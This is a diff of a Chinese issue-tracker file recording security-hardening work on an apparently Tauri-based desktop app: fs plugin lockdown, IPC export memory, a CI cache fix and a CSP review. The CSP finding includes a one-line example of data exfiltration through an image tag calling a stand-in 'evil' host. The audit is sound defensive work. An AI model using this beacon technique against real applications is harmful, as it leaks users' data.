@@ -62,7 +62,7 @@
 
 ### 收口 / 演进类
 
-#### 🖥 ISS-201 fs 插件彻底收口：持久 IO 全部走自定义命令（分支 fix/iss201-fs-plugin-fs-closeout,PR 待开,2026-08-29）
+#### ✅ ISS-201 fs 插件彻底收口：持久 IO 全部走自定义命令（已 PR #159,2026-08-29 squash merge 980993f;真机回归 NOT_VERIFIED 移交用户）
 
 - **背景:** ISS-197（PR #135）以 deny-only scope 补位，但插件面仍保留 `fs:allow-read/write-*`。「allow 空 = 放行一切」的根因在 ACL 模型本身，敏感目录之外的任意路径读写依旧不受约束。
 - **路径:** fileService（`saveFileAs` 二次写入）、wordExportService（writeFile）、wechatPreviewService（writeTextFile/save+readTextFile）、htmlPresentationService（readLocalResource）四处调用面改走受控 Rust 命令（扩展名白名单 + 黑名单复用），然后从 capabilities 删除 4 条 fs allow-*。
@@ -77,7 +77,7 @@
 - **验证:** 复现组合(AutoReload+persist 同跑)20 轮 18/20 → 20/20;全量 797/797 ×6 稳定绿。
 - **备注:** 其余 flaky 文件(如 WechatPreviewPane 等)若再现,按同模式排查(mock 时序/共享 worker 污染)。
 
-#### 🖥 ISS-215 write_binary_export IPC 序列化内存峰值（已 PR #161,2026-08-29;ISS-201 review MINOR-1）
+#### ✅ ISS-215 write_binary_export IPC 序列化内存峰值（已 PR #161,2026-08-30 squash merge f0909c1;真机大 docx 导出 NOT_VERIFIED 移交）
 
 - **发现:** write_binary_export 的 bytes 走 Vec<u8> JSON 数字数组序列化,大 docx（200MB 级）导出有数倍内存峰值,与 read 侧已用 tauri::ipc::Response 的优化不对称。
 - **建议:** 改用 tauri::ipc::Request/ResponseBody 收敛;顺带为 PRESENTATION_RESOURCE_EXTENSIONS 补直接 Rust 单测（review MINOR-2）。
@@ -89,7 +89,7 @@
 - **建议:** 改 `workspaces: src-tauri`,与 ci.yml 修复同构。
 - **修复交付(2026-08-30,zcode-idle worker):** workdir→workspaces 单点同构修复;YAML 语法/单处 rust-cache/与 ci.yml 输入逐字一致断言通过;workflows 目录 workdir 零残留。运行时缓存 key 恢复需真实 release run(tag push)——NOT_VERIFIED 留下次发版观察。
 
-#### 🖥 ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛（试验段已 PR #163,2026-08-30;img-src 等产品口径）
+#### ⏸ ISS-202 CSP 收紧评估：摘 unsafe-eval + img-src 外泄通道收敛（试验完成已 PR #163 合并 f170f27;结论:unsafe-eval 暂缓摘除〔echarts xlsx 链裸 Function〕,摘除前置另行立卡;img-src 收敛等产品口径——本卡保持挂起至用户决策）
 
 - **发现:** `tauri.conf.json:31` script-src 同时含 `'unsafe-eval' 'unsafe-inline'`，CSP 对 XSS 失去第二道拦截价值，DOMPurify 白名单成为唯一防线；`img-src http: https:` 是现成数据外泄通道（`<img src="https://evil/?d=...">` 绕过 `connect-src 'self'`）。img-src 的放开是 ISS-110/ISS-178 有意为之（外部图床图片加载），需产品层面权衡。
 - **建议:** 排查 Vditor/KaTeX/Mermaid 对 eval 的真实依赖逐项灰度摘除；保留并测试锚定 `connect-src 'self'`。
